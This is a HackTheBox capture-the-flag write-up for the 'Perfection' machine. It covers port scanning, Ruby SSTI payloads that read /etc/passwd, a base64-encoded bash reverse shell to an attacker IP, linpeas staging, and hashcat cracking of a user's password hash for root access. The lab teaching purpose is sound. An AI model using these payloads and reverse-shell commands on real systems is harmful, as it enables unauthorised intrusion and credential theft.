---
title: Perfection Writeup - HackTheBox
date: 2024-06-09
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
img_path: /assets/img/commons/perfection/
image: perfection.png
---

Hello!

In this write-up, we will dive into the **HackTheBox** [Perfection](https://app.hackthebox.com/machines/590) machine.
It is a **Linux** machine on which we will carry out a **CRLF attack** that will allow us to do **RCE** in order to get a Reverse Shell to gain access to the system.

Then, we will proceed, as always, to do a **Privilege Escalation** using the tool **Linpeas**. 

Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active.

```bash
ping -c 1 10.10.11.18
```

![ping](ping.png)


## Port scanning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.18 -oG allPorts
```

![nmap](nmap.png)

The only open ports that we see are 80 (HTTP server) and 22 (SSH), we can see more information of the services by executing:

```bash
nmap -sCV 22,80 10.10.11.18 -oN targeted -oX targetedXML
```


## Exploitation
---

If we open the IP address in firefox, we can see the following website:

![home](web_home.png)

At the bottom of the page we can see that the website is using the plugin **WEBrick 1.7.0**, searching some info of this plugin we can see that the website was build using Ruby. So we can try some **SSTI** (Server Side Template Injection), trying some payloads such as:

```ruby
<%= 7*7 %>
<%= foobar &>
```

We open **burpsuite** to see how the requests are made and try to modify them adding the previous payloads.

![burp](burpsuite1.png)

Vemos que el payload `<%= 7*7 %>` funciona:

![burp_resolve](request_resolve.png)

We can now try to open a file from the server (e.g. the `/etc/passwd` file)

```ruby
a%0A<%25%3d+File.open('etc/passwd').read+%25>
```

We see that the browser resolves our payload and we can see the content of the file:

![passwd_file](etc_passwd.png)

<br>

### Obtaining a Reverse Shell

First we will create a reverse shell script in bash:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"
```

We encode it to base64 and copy it to the clipboard:

```bash
cat revshell.sh | base64 | xclip -sel clip
```

And encode it back to url, using [cyberchef](https://gchq.github.io/CyberChef/).

We open netcat in listening mode: `nc -nvlp 4444` and make a new request adding the following payload:

```ruby
a%0A<%25%3d+system("echo+'<payload_base64_url_encoded>'+|base64+-d+|bash")%3b+%25>
```

If everything has worked correctly, we have a reverse shell but let's improve it by executing the following command (on the victim machine):

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![revshell](revshell.png)

Now we can access the user flag.

<br>

## Privilege escalation
---

We could run the command `sudo -l` to try to find superuser processes that we can run as the user Susan, but since we don't have the user's password, we can't do anything in this case.

So, for escalation, we are going to use the [Linpeas](https://github.com/peass-ng/PEASS-ng) tool that helps us to find possible attack vectors for escalation.

```bash
# En la máquina atacante
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python -m http.server 80

# En la máquina víctima
wget 10.10.x.x:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

We let Linpeas run in search of information. While it's running, let's see what is contained in the `pupilpath_credentials.db` file in the `Migration` directory.


We find a password hash for the user Susan, and linpeas has found a file that we can access and that may contain interesting information: `/var/mail/susan`. We see that it contains an email suggesting to change the password of all users to `{name}_{reversed-name}_{random-number-between-000000000-and-100000000}`.

With this structure and knowing the hash of the password we can run hashcat to decrypt the password:

```bash
echo "hash" > hash.txt
hashcat -m 1400 hash.txt -a 3 "susan_nasus_?d?d?d?d?d?d?d?d?d"
```

When hashcat has finished, we will be able to access the system as superuser (by executing `sudo su`).

We have already compromised the whole system and (of course) we can now obtain the final flag of the challenge.


> H4Ppy H4ck1ng!
